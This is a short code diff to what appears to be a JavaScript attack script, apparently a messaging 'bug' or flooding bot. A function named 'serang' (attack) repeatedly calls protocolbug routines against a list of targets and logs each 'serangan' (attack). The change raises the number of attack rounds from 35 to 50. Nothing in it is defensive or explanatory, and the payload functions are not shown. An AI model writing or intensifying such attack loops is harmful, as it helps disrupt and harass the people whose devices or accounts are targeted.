@@ -342,7 +342,7 @@ function cekJam() {
 
 function serang(targets) {
   return new Promise(async resolve => {
-    for (let i = 1; i <= 35; i++) {
+    for (let i = 1; i <= 50; i++) {
       cekJam();
       await protocolbug5();
       await tunggu(1500);
@@ -354,7 +354,7 @@ function serang(targets) {
       await tunggu(1500);
       await protocolbug3();
       console.log("serangan ke-" + i);
-      if (i == 35) {
+      if (i == 50) {
         resolve();
       }
     }
